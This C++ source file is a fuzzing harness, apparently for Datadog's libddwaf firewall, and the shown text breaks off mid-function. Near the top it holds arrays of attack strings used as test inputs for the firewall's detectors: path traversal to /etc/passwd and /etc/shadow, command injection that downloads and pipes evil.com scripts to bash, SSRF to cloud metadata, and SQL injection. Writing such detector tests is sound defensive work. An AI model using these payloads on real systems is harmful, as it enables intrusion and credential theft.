// Unless explicitly stated otherwise all files in this repository are
// dual-licensed under the Apache-2.0 License or BSD-3-Clause License.
//
// This product includes software developed at Datadog (https://www.datadoghq.com/).
// Copyright 2025 Datadog, Inc.

#include <cstdint>
#include <cstdlib>
#include <cstring>
#include <ddwaf.h>
#include <memory>
#include <vector>

// Include internal header for memory resource access
#include "context_allocator.hpp"

// Include JSON utilities
#include "../../tests/common/json_utils.hpp"

#include "../common/afl_wrapper.hpp"
#include "../common/utils.hpp"

// Include embedded configuration
#include "embedded_configs.hpp"

using namespace ddwaf;
using namespace ddwaf_afl;
using namespace std::literals;

// Global WAF handle - initialized once with the json rules embeed in the binary
static ddwaf_handle g_waf_handle = nullptr;

// Global WAF context - reused for all test cases to avoid allocation overhead
static ddwaf_context g_waf_context = nullptr;

const std::vector<const char *> attack_uris = {
    "/app?file=../../../../etc/passwd",                    // LFI attack
    "/search?q=test; cat /etc/passwd",                     // CMDI attack
    "/proxy?url=http://169.254.169.254/metadata",          // SSRF attack
    "/download?path=../../../windows/system32/config/sam", // LFI Windows
    "/exec?cmd=wget http://evil.com/shell.sh",             // CMDI with download
    "/redirect?target=file:///etc/hosts",                  // SSRF file scheme
    "/api/v1/users?filter='; DROP TABLE users;--",         // SQL injection
    "/upload?filename=shell.php%00.jpg"                    // Null byte injection
};

const std::vector<const char *> attack_queries = {
    "file=../../../../etc/passwd&type=include",                   // LFI attack
    "cmd=ls -la; cat /etc/shadow && whoami",                      // CMDI with shell operators
    "url=http://127.0.0.1:8080/admin",                            // SSRF attack
    "path=..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",    // LFI Windows
    "exec=curl -o /tmp/shell http://evil.com/backdoor.sh | bash", // CMDI with pipe
    "redirect=gopher://internal.company.com:25",                  // SSRF gopher
    "include=/proc/self/environ",                                 // LFI proc
    "system=$(wget -qO- http://evil.com/cmd) && eval $REPLY"      // Complex shell expansion
};
// Create shell command arrays to exercise shi_common.cpp
const std::vector<std::vector<const char *>> shell_commands = {
    {"sh", "-c", "cat /etc/passwd", nullptr}, {"bash", "-c", "ls -la; whoami", nullptr},
    {"curl", "-o", "/tmp/shell.sh", "http://evil.com/backdoor", nullptr},
    {"wget", "-O", "/dev/null", "http://169.254.169.254/metadata", nullptr}};

// Generate URLs that trigger SSRF detector
const std::vector<const char *> ssrf_urls = {
    "http://169.254.169.254/latest/meta-data/", // AWS metadata
    "http://127.0.0.1:8080/admin/config",       // Local admin
    "file:///etc/passwd",                       // File scheme
    "ftp://internal.company.com/secrets/",      // Internal FTP
    "http://localhost:3306/mysql",              // Database port
    "gopher://127.0.0.1:25/",                   // Gopher protocol
    "dict://localhost:11211/stats",             // Dict protocol
    "ldap://internal.ad.company.com/"           // LDAP
};

// Generate IP addresses including some that match blocked IPs in rules_data
const std::vector<const char *> ip_addresses = {
    "192.168.1.100", // Matches blocked_ips data
    "10.0.0.50",     // Matches blocked_ips data
    "127.0.0.1",     // Localhost
    "203.0.113.1",   // Test IP
    "198.51.100.1",  // Test IP
    "172.16.0.1",    // Private IP
    "10.0.0.1",      // Private IP
    "192.168.1.1"    // Private IP
};

// Create SQL statements with database-specific syntax to exercise tokenizers
const std::vector<const char *> sql_statements = {
    "SELECT * FROM users WHERE id = $1 AND status = 'active'",              // PostgreSQL style
    "SELECT name FROM products WHERE price < ? LIMIT 10",                   // Generic/MySQL style
    "INSERT INTO logs (message, created_at) VALUES (?, datetime('now'))",   // SQLite style
    "UPDATE accounts SET balance = balance + ? WHERE user_id = ?",          // Generic
    "DELETE FROM sessions WHERE expires_at < NOW()",                        // MySQL/PostgreSQL
    "SELECT u.name, p.title FROM users u JOIN posts p ON u.id = p.user_id", // Complex join
    "CREATE TABLE test (id INTEGER PRIMARY KEY, data TEXT)",                // DDL
    "DROP TABLE IF EXISTS temp_data"                                        // DDL
};

// Cycle through different database types to exercise specific tokenizers
const std::vector<const char *> db_types = {
    "postgresql", // Triggers pgsql_tokenizer
    "pgsql",      // Alternative PostgreSQL trigger
    "sqlite",     // Triggers sqlite_tokenizer
    "mysql",      // Triggers mysql_tokenizer
    "mysql2",     // Alternative MySQL trigger
    "oracle",     // Triggers oracle tokenizer
    "doctrine",   // Triggers doctrine tokenizer
    "hsqldb"      // Triggers hsqldb tokenizer
};

const std::vector<const char *> http_methods = {
    "GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"};

const std::vector<const char *> jwt_tokens = {
    "signature",
    "Bearer "
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9."
    "eyJhdWQiOiIxIiwianRpIjoiYWJjZGVmZ2hpaiIsImlhdCI6MTYxNjE2MTYxNiwiZXhwIjoxNjE2MTY1MjE2fQ."
    "eyJhbGciOiJSUzM4NCIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.signature_rs384",
    "eyJyb2xlIjoiYWRtaW4iLCJ1c2VyIjoiYWRtaW4iLCJleHAiOjE2MTYxNjUyMTZ9.admin_token",
    "Bearer eyJhbGciOiJIUzI1NiJ9.invalid",
    "Bearer malformed_token_no_dots",
    "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIn0.",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."
    "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ."
    "SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c",
};

const std::vector<const char *> http_headers_keys = {
    "Content-Type",
    "Host",
    "User-Agent",
    "Accept",
    "Accept-Encoding",
    "Accept-Language",
    "Accept-Charset",
    "Connection",
};

const std::vector<const char *> http_headers_values = {
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/plain",
    "application/octet-stream",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "application/json,text/html",
    "gzip,deflate",
    "en-US,en;q=0.9",
    "utf-8",
    "keep-alive",
};

// Cookie key-value pairs to exercise normalize_key and normalize_value functions
const std::vector<std::pair<const char *, const char *>> cookie_pairs = {
    {"session_id", "1234567890"}, {"user_id", "9876543210"},
    {"theme", "dark,mode"},                // Contains comma to test normalize_value escaping
    {"CSRF_TOKEN", "ABC,DEF=GHI"},         // Mixed case and special chars for normalize_key
    {"preferences", "lang=en,theme=dark"}, // Nested comma values
    {"User-Agent", "Mozilla/5.0"},         // Dash in key name
    {"api_key", "key,with,commas"},        // Multiple commas to test escaping
    {"auth_token", "bearer_token_123"}, {"cart_items", "item1,item2,item3"}, // Array-like values
    {"notification,settings", "enabled"}, // Comma in key name to test normalize_key
};

const std::vector<const char *> query_params = {
    "page=1",
    "page=1&limit=10",
    "page=1&limit=10&sort=name",
    "page=1&limit=10&sort=name&order=asc",
    "page=1&limit=10&sort=name&order=asc&filter=active",
    "page=1&limit=10&sort=name&order=asc&filter=active&search=john",
    "page=1&limit=10&sort=name&order=asc&filter=active&search=john&sort=email",
    "page=1&limit=10&sort=name&order=asc&filter=active&search=john&sort=email&order=desc",
    "page=1&limit=10&sort=name&order=asc&filter=active&search=john&sort=email&order=desc&page=2",
    "page=1&limit=10&sort=name&order=asc&filter=active&search=john&sort=email&order=desc&page=2&"
    "limit=20",
};

const std::vector<const char *> user_ids = {
    "1234567890",
    "1234567890",
};

const std::vector<const char *> session_ids = {
    "1234567890",
    "1234567890",
};

const std::vector<const char *> custom_resources_names = {
    "server.io.fs.file",
    "server.request.query",
    "server.request.body",
    "server.request.uri_raw",
    "server.request.headers",
    "server.request.uri.raw",
    "server.request.params",
    "server.request.cookies",
    "server.request.trailers",
    "server.request.path_params",
    "server.request.method",
    "server.request.headers.no_cookies",
    "server.io.net.url",
    "server.db.statement",
    "server.db.system",
    "http.client_ip",
    "grpc.server.method",
    "grpc.server.request.message",
    "grpc.server.request.metadata",
};

// Helper to create a request object from input data
ddwaf_object create_request_object(InputSplitter &splitter)
{
    ddwaf_object root, tmp;
    ddwaf_object_map(&root);

    // Use first byte to determine request structure type
    uint8_t request_type = splitter.get<uint8_t>() % 6;

    switch (request_type) {
    case 0: {
        // HTTP request structure
        auto uri_index = splitter.get<uint8_t>();
        auto uri = splitter.get_string();

        auto query_index = splitter.get<uint8_t>();
        auto query = splitter.get_string();

        auto body_type = splitter.get<uint8_t>();
        auto body = splitter.get_string();

        auto method_index = splitter.get<uint8_t>();
        auto method = splitter.get_string();

        auto jwt_index = splitter.get<uint8_t>();

        if (uri_index < attack_uris.size()) {
            // Generate URI patterns that trigger security detectors
            const char *selected_uri = attack_uris[uri_index];
            ddwaf_object_map_addl(&root, "server.request.uri_raw", 22,
                ddwaf_object_stringl(&tmp, selected_uri, strlen(selected_uri)));
        } else {
            // Use the URI string directly as fallback
            ddwaf_object_map_addl(&root, "server.request.uri_raw", 22,
                ddwaf_object_stringl(&tmp, uri.data(), uri.size()));
        }

        if (query_index < attack_queries.size()) {
            // Generate query patterns for security detectors with complex shell tokenization
            const char *selected_query = attack_queries[query_index];
            ddwaf_object_map_addl(&root, "server.request.query", 20,
                ddwaf_object_stringl(&tmp, selected_query, strlen(selected_query)));
        } else {
            // Use the query string directly as fallback
            ddwaf_object_map_addl(&root, "server.request.query", 20,
                ddwaf_object_stringl(&tmp, query.data(), query.size()));
        }

        // Create complex nested structures for extract_schema processor
        switch (body_type) {
        case 0: {
            // Complex nested object structure for schema extraction
            ddwaf_object body_obj, data_obj, user_obj, profile_obj, settings_obj, metadata_obj;
            ddwaf_object name_tmp, email_tmp, age_tmp, active_tmp, theme_tmp, lang_tmp;
            ddwaf_object version_tmp, timestamp_tmp, null_tmp, float_tmp, permissions_array;

            ddwaf_object_map(&body_obj);
            ddwaf_object_map(&data_obj);
            ddwaf_object_map(&user_obj);
            ddwaf_object_map(&profile_obj);
            ddwaf_object_map(&settings_obj);
            ddwaf_object_map(&metadata_obj);
            ddwaf_object_array(&permissions_array);

            // Create diverse data types for comprehensive schema analysis
            ddwaf_object_map_addl(
                &profile_obj, "name", 4, ddwaf_object_stringl(&name_tmp, "John Doe", 8));
            ddwaf_object_map_addl(
                &profile_obj, "email", 5, ddwaf_object_stringl(&email_tmp, "john@example.com", 16));
            ddwaf_object_map_addl(&profile_obj, "age", 3, ddwaf_object_signed(&age_tmp, 30));
            ddwaf_object_map_addl(&profile_obj, "active", 6, ddwaf_object_bool(&active_tmp, true));
            ddwaf_object_map_addl(&profile_obj, "score", 5, ddwaf_object_float(&float_tmp, 95.7));
            ddwaf_object_map_addl(&profile_obj, "deprecated", 10, ddwaf_object_null(&null_tmp));

            ddwaf_object_map_addl(
                &settings_obj, "theme", 5, ddwaf_object_stringl(&theme_tmp, "dark", 4));
            ddwaf_object_map_addl(
                &settings_obj, "language", 8, ddwaf_object_stringl(&lang_tmp, "en", 2));

            // Add metadata with various types for deeper schema extraction
            ddwaf_object_map_addl(
                &metadata_obj, "version", 7, ddwaf_object_stringl(&version_tmp, "2.1.0", 5));
            ddwaf_object_map_addl(
                &metadata_obj, "timestamp", 9, ddwaf_object_unsigned(&timestamp_tmp, 1640995200));

            // Create permissions array for array schema extraction
            ddwaf_object perm1, perm2, perm3;
            ddwaf_object_stringl(&perm1, "read", 4);
            ddwaf_object_stringl(&perm2, "write", 5);
            ddwaf_object_stringl(&perm3, "admin", 5);
            ddwaf_object_array_add(&permissions_array, &perm1);
            ddwaf_object_array_add(&permissions_array, &perm2);
            ddwaf_object_array_add(&permissions_array, &perm3);

            ddwaf_object_map_addl(&user_obj, "profile", 7, &profile_obj);
            ddwaf_object_map_addl(&user_obj, "settings", 8, &settings_obj);
            ddwaf_object_map_addl(&user_obj, "permissions", 11, &permissions_array);
            ddwaf_object_map_addl(&data_obj, "user", 4, &user_obj);
            ddwaf_object_map_addl(&data_obj, "metadata", 8, &metadata_obj);
            ddwaf_object_map_addl(&body_obj, "data", 4, &data_obj);
            ddwaf_object_map_addl(&root, "server.request.body", 19, &body_obj);
            break;
        }
        case 1: {
            // Complex array structure for schema extraction
            ddwaf_object body_obj, items_array, products_array, nested_obj;
            ddwaf_object item1, item2, item3, product1, product2;
            ddwaf_object id1_tmp, name1_tmp, id2_tmp, name2_tmp, id3_tmp, name3_tmp;
            ddwaf_object price1_tmp, price2_tmp, available1_tmp, available2_tmp;
            ddwaf_object category_tmp, tags_array, tag1, tag2;

            ddwaf_object_map(&body_obj);
            ddwaf_object_array(&items_array);
            ddwaf_object_array(&products_array);
            ddwaf_object_array(&tags_array);
            ddwaf_object_map(&item1);
            ddwaf_object_map(&item2);
            ddwaf_object_map(&item3);
            ddwaf_object_map(&product1);
            ddwaf_object_map(&product2);
            ddwaf_object_map(&nested_obj);

            // Create array items with different structures and types
            ddwaf_object_map_addl(&item1, "id", 2, ddwaf_object_signed(&id1_tmp, 1));
            ddwaf_object_map_addl(&item1, "name", 4, ddwaf_object_stringl(&name1_tmp, "item1", 5));

            ddwaf_object_map_addl(&item2, "id", 2, ddwaf_object_signed(&id2_tmp, 2));
            ddwaf_object_map_addl(&item2, "name", 4, ddwaf_object_stringl(&name2_tmp, "item2", 5));

            ddwaf_object_map_addl(&item3, "id", 2, ddwaf_object_signed(&id3_tmp, 3));
            ddwaf_object_map_addl(&item3, "name", 4, ddwaf_object_stringl(&name3_tmp, "item3", 5));

            // Create products with mixed data types for schema diversity
            ddwaf_object_map_addl(&product1, "price", 5, ddwaf_object_float(&price1_tmp, 29.99));
            ddwaf_object_map_addl(
                &product1, "available", 9, ddwaf_object_bool(&available1_tmp, true));
            ddwaf_object_map_addl(&product2, "price", 5, ddwaf_object_float(&price2_tmp, 49.99));
            ddwaf_object_map_addl(
                &product2, "available", 9, ddwaf_object_bool(&available2_tmp, false));

            // Create nested tags array
            ddwaf_object_stringl(&tag1, "electronics", 11);
            ddwaf_object_stringl(&tag2, "gadgets", 7);
            ddwaf_object_array_add(&tags_array, &tag1);
            ddwaf_object_array_add(&tags_array, &tag2);

            ddwaf_object_array_add(&items_array, &item1);
            ddwaf_object_array_add(&items_array, &item2);
            ddwaf_object_array_add(&items_array, &item3);

            ddwaf_object_array_add(&products_array, &product1);
            ddwaf_object_array_add(&products_array, &product2);

            ddwaf_object_map_addl(
                &nested_obj, "category", 8, ddwaf_object_stringl(&category_tmp, "shopping", 8));
            ddwaf_object_map_addl(&nested_obj, "tags", 4, &tags_array);

            ddwaf_object_map_addl(&body_obj, "items", 5, &items_array);
            ddwaf_object_map_addl(&body_obj, "products", 8, &products_array);
            ddwaf_object_map_addl(&body_obj, "metadata", 8, &nested_obj);
            ddwaf_object_map_addl(&root, "server.request.body", 19, &body_obj);
            break;
        }
        case 2: {
            // Shell command array structure for shi_common.cpp coverage
            ddwaf_object body_obj, cmd_array;
            ddwaf_object cmd_part;

            ddwaf_object_map(&body_obj);
            ddwaf_object_array(&cmd_array);

            auto cmd_set = splitter.get<uint8_t>() % shell_commands.size();
            const auto &selected_cmd = shell_commands[cmd_set];
            for (int i = 0; i < selected_cmd.size(); i++) {
                if (selected_cmd[i] != NULL) {
                    ddwaf_object_stringl(&cmd_part, selected_cmd[i], strlen(selected_cmd[i]));
                    ddwaf_object_array_add(&cmd_array, &cmd_part);
                }
            }

            ddwaf_object_map_addl(&body_obj, "command", 7, &cmd_array);
            ddwaf_object_map_addl(&root, "server.request.body", 19, &body_obj);
            break;
        }
        case 3: {
            // Deep nested structure to test extract_schema max_container_depth limits
            ddwaf_object body_obj, level1, level2, level3, level4, level5, level6, level7, level8,
                level9, level10;
            ddwaf_object level11, level12, level13, level14, level15, level16, level17, level18,
                level19, level20;
            ddwaf_object deep_value, mixed_array, array_item1, array_item2;

            ddwaf_object_map(&body_obj);
            ddwaf_object_map(&level1);
            ddwaf_object_map(&level2);
            ddwaf_object_map(&level3);
            ddwaf_object_map(&level4);
            ddwaf_object_map(&level5);
            ddwaf_object_map(&level6);
            ddwaf_object_map(&level7);
            ddwaf_object_map(&level8);
            ddwaf_object_map(&level9);
            ddwaf_object_map(&level10);
            ddwaf_object_map(&level11);
            ddwaf_object_map(&level12);
            ddwaf_object_map(&level13);
            ddwaf_object_map(&level14);
            ddwaf_object_map(&level15);
            ddwaf_object_map(&level16);
            ddwaf_object_map(&level17);
            ddwaf_object_map(&level18);
            ddwaf_object_map(&level19);
            ddwaf_object_map(&level20);
            ddwaf_object_array(&mixed_array);
            ddwaf_object_map(&array_item1);
            ddwaf_object_map(&array_item2);

            // Create very deep nesting that exceeds max_container_depth (18)
            ddwaf_object_stringl(&deep_value, "deep_nested_value", 17);
            ddwaf_object_map_addl(&level20, "final", 5, &deep_value);
            ddwaf_object_map_addl(&level19, "level20", 7, &level20);
            ddwaf_object_map_addl(&level18, "level19", 7, &level19);
            ddwaf_object_map_addl(&level17, "level18", 7, &level18);
            ddwaf_object_map_addl(&level16, "level17", 7, &level17);
            ddwaf_object_map_addl(&level15, "level16", 7, &level16);
            ddwaf_object_map_addl(&level14, "level15", 7, &level15);
            ddwaf_object_map_addl(&level13, "level14", 7, &level14);
            ddwaf_object_map_addl(&level12, "level13", 7, &level13);
            ddwaf_object_map_addl(&level11, "level12", 7, &level12);
            ddwaf_object_map_addl(&level10, "level11", 7, &level11);
            ddwaf_object_map_addl(&level9, "level10", 7, &level10);
            ddwaf_object_map_addl(&level8, "level9", 6, &level9);
            ddwaf_object_map_addl(&level7, "level8", 6, &level8);
            ddwaf_object_map_addl(&level6, "level7", 6, &level7);
            ddwaf_object_map_addl(&level5, "level6", 6, &level6);
            ddwaf_object_map_addl(&level4, "level5", 6, &level5);
            ddwaf_object_map_addl(&level3, "level4", 6, &level4);
            ddwaf_object_map_addl(&level2, "level3", 6, &level3);
            ddwaf_object_map_addl(&level1, "level2", 6, &level2);

            // Add array items to test array limits
            ddwaf_object array_val1, array_val2;
            ddwaf_object_map_addl(&array_item1, "id", 2, ddwaf_object_signed(&array_val1, 1));
            ddwaf_object_map_addl(&array_item2, "id", 2, ddwaf_object_signed(&array_val2, 2));
            ddwaf_object_array_add(&mixed_array, &array_item1);
            ddwaf_object_array_add(&mixed_array, &array_item2);

            ddwaf_object_map_addl(&body_obj, "deep_structure", 14, &level1);
            ddwaf_object_map_addl(&body_obj, "mixed_array", 11, &mixed_array);
            ddwaf_object_map_addl(&root, "server.request.body", 19, &body_obj);
            break;
        }
        default: {
            // Simple body structure
            ddwaf_object_map_addl(&root, "server.request.body", 19,
                ddwaf_object_stringl(&tmp, body.data(), body.size()));
            break;
        }
        }

        if (method_index < http_methods.size()) {
            const char *selected_method = http_methods[method_index];
            ddwaf_object_map_addl(&root, "server.request.method", 21,
                ddwaf_object_stringl(&tmp, selected_method, strlen(selected_method)));
        } else {
            // Use the method string directly as fallback
            ddwaf_object_map_addl(&root, "server.request.method", 21,
                ddwaf_object_stringl(&tmp, method.data(), method.size()));
        }

        // Add Authorization header with JWT token for jwt_decode processor
        ddwaf_object headers_obj, auth_tmp;
        ddwaf_object_map(&headers_obj);

        if (jwt_index < jwt_tokens.size()) {
            const char *selected_jwt = jwt_tokens[jwt_index];
            ddwaf_object_map_addl(&headers_obj, "authorization", 13,
                ddwaf_object_stringl(&auth_tmp, selected_jwt, strlen(selected_jwt)));
        } else {
            // Use a default JWT token
            const char *default_jwt = jwt_tokens[0];
            ddwaf_object_map_addl(&headers_obj, "authorization", 13,
                ddwaf_object_stringl(&auth_tmp, default_jwt, strlen(default_jwt)));
        }

        ddwaf_object_map_addl(&root, "server.request.headers.no_cookies", 33, &headers_obj);

        // Add cookies to exercise session_fingerprint and kv_hash_fields
        ddwaf_object cookies_obj;
        ddwaf_object_map(&cookies_obj);
        auto cookie_idx = splitter.get<uint8_t>() % cookie_pairs.size();
        const auto &[key, value] = cookie_pairs[cookie_idx];
        ddwaf_object cookie_value;
        ddwaf_object_map_addl(&cookies_obj, key, strlen(key),
            ddwaf_object_stringl(&cookie_value, value, strlen(value)));
        ddwaf_object_map_addl(&root, "server.request.cookies", 22, &cookies_obj);

        // Add session and user data
        auto session_idx = splitter.get<uint8_t>() % session_ids.size();
        auto user_idx = splitter.get<uint8_t>() % user_ids.size();
        ddwaf_object_map_addl(&root, "usr.session_id", 14,
            ddwaf_object_stringl(&tmp, session_ids[session_idx], strlen(session_ids[session_idx])));
        ddwaf_object_map_addl(&root, "usr.id", 6,
            ddwaf_object_stringl(&tmp, user_ids[user_idx], strlen(user_ids[user_idx])));

        break;
    }
    case 1: {
        // Network/IP focused structure
        auto ip_index = splitter.get<uint8_t>();
        auto url_index = splitter.get<uint8_t>();
        auto client_ip = splitter.get_string();
        auto url = splitter.get_string();

        if (ip_index < ip_addresses.size()) {
            const char *selected_ip = ip_addresses[ip_index];
            ddwaf_object_map_addl(&root, "http.client_ip", 14,
                ddwaf_object_stringl(&tmp, selected_ip, strlen(selected_ip)));
        } else {
            // Use the client_ip string directly as fallback
            ddwaf_object_map_addl(&root, "http.client_ip", 14,
                ddwaf_object_stringl(&tmp, client_ip.data(), client_ip.size()));
        }

        if (url_index < ssrf_urls.size()) {
            const char *selected_url = ssrf_urls[url_index];
            ddwaf_object_map_addl(&root, "server.io.net.url", 17,
                ddwaf_object_stringl(&tmp, selected_url, strlen(selected_url)));
        } else {
            // Use the url string directly as fallback
            ddwaf_object_map_addl(
                &root, "server.io.net.url", 17, ddwaf_object_stringl(&tmp, url.data(), url.size()));
        }
        break;
    }
    case 2: {
        // Database focused structure
        auto db_statement_index = splitter.get<uint8_t>();
        auto db_type_index = splitter.get<uint8_t>();
        auto db_system = splitter.get_string();
        auto query_param_index = splitter.get<uint8_t>();
        auto query_param = splitter.get_string();

        if (db_statement_index < sql_statements.size()) {
            const char *selected_sql = sql_statements[db_statement_index];
            ddwaf_object_map_addl(&root, "server.db.statement", 19,
                ddwaf_object_stringl(&tmp, selected_sql, strlen(selected_sql)));
        } else {
            // Use the db_system string directly as fallback
            ddwaf_object_map_addl(&root, "server.db.statement", 19,
                ddwaf_object_stringl(&tmp, db_system.data(), db_system.size()));
        }

        if (db_type_index < db_types.size()) {
            const char *selected_db = db_types[db_type_index];
            ddwaf_object_map_addl(&root, "server.db.system", 16,
                ddwaf_object_stringl(&tmp, selected_db, strlen(selected_db)));
        } else {
            // Use the db_system string directly as fallback
            ddwaf_object_map_addl(&root, "server.db.system", 16,
                ddwaf_object_stringl(&tmp, db_system.data(), db_system.size()));
        }

        if (query_param_index < query_params.size()) {
            const char *selected_query_param = query_params[query_param_index];
            ddwaf_object_map_addl(&root, "server.request.query", 20,
                ddwaf_object_stringl(&tmp, selected_query_param, strlen(selected_query_param)));
        } else {
            // Use the query_param string directly as fallback
            ddwaf_object_map_addl(&root, "server.request.query", 20,
                ddwaf_object_stringl(&tmp, query_param.data(), query_param.size()));
        }
        break;
    }
    case 3: {
        // Headers, cookies, and user session structure
        auto headers_key_index = splitter.get<uint8_t>();
        auto headers_value_index = splitter.get<uint8_t>();
        auto headers = splitter.get_string();

        auto cookies_index = splitter.get<uint8_t>();
        auto cookies = splitter.get_string();

        auto session_id_index = splitter.get<uint8_t>();
        auto session_id = splitter.get_string();

        auto user_id_index = splitter.get<uint8_t>();
        auto user_id = splitter.get_string();

        auto jwt_index = splitter.get<uint8_t>();
        auto jwt = splitter.get_string();

        ddwaf_object headers_obj, cookies_obj;
        ddwaf_object_map(&headers_obj);
        // cookies_obj will be initialized later as a proper map

        if (headers_key_index < sizeof(http_headers_keys) / sizeof(http_headers_keys[0]) &&
            headers_value_index < sizeof(http_headers_values) / sizeof(http_headers_values[0])) {
            const char *selected_headers_key = http_headers_keys[headers_key_index];
            const char *selected_headers_value = http_headers_values[headers_value_index];
            ddwaf_object_map_addl(&headers_obj, selected_headers_key, strlen(selected_headers_key),
                ddwaf_object_stringl(&tmp, selected_headers_value, strlen(selected_headers_value)));

        } else {
            // Use the headers string directly as fallback
            ddwaf_object_map_addl(&headers_obj, "content-type", 12,
                ddwaf_object_stringl(&tmp, headers.data(), headers.size()));
        }

        // Add Authorization header with JWT token for jwt_decode processor
        ddwaf_object auth_tmp;
        if (jwt_index < jwt_tokens.size()) {
            const char *selected_jwt = jwt_tokens[jwt_index];
            ddwaf_object_map_addl(&headers_obj, "authorization", 13,
                ddwaf_object_stringl(&auth_tmp, selected_jwt, strlen(selected_jwt)));
        } else {
            ddwaf_object_map_addl(&headers_obj, "authorization", 13,
                ddwaf_object_stringl(&auth_tmp, jwt.data(), jwt.size()));
        }

        // Create cookies as a proper key-value map to exercise kv_hash_fields
        ddwaf_object_map(&cookies_obj);
        if (cookies_index < cookie_pairs.size()) {
            // Use predefined cookie pairs that exercise normalize_key/normalize_value
            auto num_cookies = (cookies_index % 3) + 1; // 1-3 cookies
            for (int i = 0; i < num_cookies && (cookies_index + i) < cookie_pairs.size(); i++) {
                const auto &[key, value] = cookie_pairs[cookies_index + i];
                ddwaf_object cookie_value;
                ddwaf_object_map_addl(&cookies_obj, key, strlen(key),
                    ddwaf_object_stringl(&cookie_value, value, strlen(value)));
            }
        } else {
            // Create a fallback cookie from fuzz data
            ddwaf_object cookie_value;
            ddwaf_object_map_addl(&cookies_obj, "fuzz_cookie", 11,
                ddwaf_object_stringl(&cookie_value, cookies.data(), cookies.size()));
        }

        // Add session_id and user_id directly to root (they are string values, not maps)
        if (session_id_index < session_ids.size()) {
            const char *selected_session_id = session_ids[session_id_index];
            ddwaf_object_map_addl(&root, "usr.session_id", 14,
                ddwaf_object_stringl(&tmp, selected_session_id, strlen(selected_session_id)));
        } else {
            // Use the session_id string directly as fallback
            ddwaf_object_map_addl(&root, "usr.session_id", 14,
                ddwaf_object_stringl(&tmp, session_id.data(), session_id.size()));
        }

        if (user_id_index < user_ids.size()) {
            const char *selected_user_id = user_ids[user_id_index];
            ddwaf_object_map_addl(&root, "usr.id", 6,
                ddwaf_object_stringl(&tmp, selected_user_id, strlen(selected_user_id)));
        } else {
            // Use the user_id string directly as fallback
            ddwaf_object_map_addl(
                &root, "usr.id", 6, ddwaf_object_stringl(&tmp, user_id.data(), user_id.size()));
        }

        ddwaf_object_map_addl(&root, "server.request.headers", 20, &headers_obj);
        ddwaf_object_map_addl(&root, "server.request.cookies", 22, &cookies_obj);
        break;
    }
    case 4: {
        // Large array structure to test extract_schema max_array_nodes limits
        auto large_array_size = splitter.get<uint8_t>() % 20 + 5; // 5-24 items

        ddwaf_object body_obj, large_array, headers_obj, auth_tmp;
        ddwaf_object_map(&body_obj);
        ddwaf_object_array(&large_array);
        ddwaf_object_map(&headers_obj);

        // Create a large array that exceeds max_array_nodes (10)
        for (int i = 0; i < large_array_size; i++) {
            auto data = splitter.get_string();
            ddwaf_object item, id_tmp, data_tmp;
            ddwaf_object_map(&item);
            ddwaf_object_map_addl(&item, "id", 2, ddwaf_object_signed(&id_tmp, i));
            ddwaf_object_map_addl(
                &item, "data", 4, ddwaf_object_stringl(&data_tmp, data.data(), data.size()));
            ddwaf_object_array_add(&large_array, &item);
        }

        ddwaf_object_map_addl(&body_obj, "large_collection", 16, &large_array);
        ddwaf_object_map_addl(&root, "server.request.body", 19, &body_obj);
        break;
    }
    case 5: {
        ddwaf_object resource_obj;
        ddwaf_object_map(&resource_obj);
        // Hard generator of random resources
        auto custom_resource_index = splitter.get<uint8_t>();
        auto custom_resource_name = splitter.get_string();

        // We don't set a default set of values, we let the fuzzer generate it.
        auto custom_resource_value = splitter.get_string();

        if (custom_resource_index < custom_resources_names.size()) {
            const char *selected_custom_resource_name =
                custom_resources_names[custom_resource_index];
            ddwaf_object_map_addl(&resource_obj, selected_custom_resource_name,
                strlen(selected_custom_resource_name),
                ddwaf_object_stringl(
                    &tmp, custom_resource_value.data(), custom_resource_value.size()));
        } else {
            // Use the custom_resource_name string directly as fallback
            ddwaf_object_map_addl(&resource_obj, custom_resource_name.data(),
                custom_resource_name.size(),
                ddwaf_object_stringl(
                    &tmp, custom_resource_value.data(), custom_resource_value.size()));
        }
        ddwaf_object_map_addl(&root, "server.request.headers", 20, &resource_obj);
        break;
    }
    }

    return root;
}

// Initialize WAF with simple_rules.json configuration
// This is done only once because the ruleset is static for a fuzzer, but is very costly to load.
ddwaf_handle initialize_waf()
{
    try {
        // Use the simple_rules.json configuration for better coverage
        std::string json_string{embedded_configs::simple_rules_json};
        ddwaf_object ruleset = json_to_object(json_string);

        // Initialize WAF
        ddwaf_config config{{0, 0, 0}, {nullptr, nullptr}, ddwaf_object_free};
        ddwaf_object diagnostics;
        ddwaf_handle handle = ddwaf_init(&ruleset, &config, &diagnostics);

        ddwaf_object_free(&ruleset);
        ddwaf_object_free(&diagnostics);

        if (handle == nullptr) {
            // WAF initialization failed - crash
            __builtin_trap();
        }

        return handle;
    } catch (...) {
        // Rule loading failed - crash immediately
        __builtin_trap();
    }
}

extern "C" int LLVMFuzzerInitialize(int *argc, char ***argv)
{
    // Set up memory resource
    ddwaf::memory::set_local_memory_resource(std::pmr::new_delete_resource());

    // Initialize WAF once with simple_rules.json
    g_waf_handle = initialize_waf();
    if (g_waf_handle == nullptr) {
        // WAF initialization failed - crash
        __builtin_trap();
    }

    // Initialize global context once for reuse across all test cases
    g_waf_context = ddwaf_context_init(g_waf_handle);
    if (g_waf_context == nullptr) {
        // Context initialization failed - crash
        __builtin_trap();
    }

    // Exercise ddwaf_known_addresses and ddwaf_known_actions API functions
    uint32_t addresses_size = 0;
    const char *const *addresses = ddwaf_known_addresses(g_waf_handle, &addresses_size);
    prevent_optimization(addresses);
    prevent_optimization(addresses_size);

    uint32_t actions_size = 0;
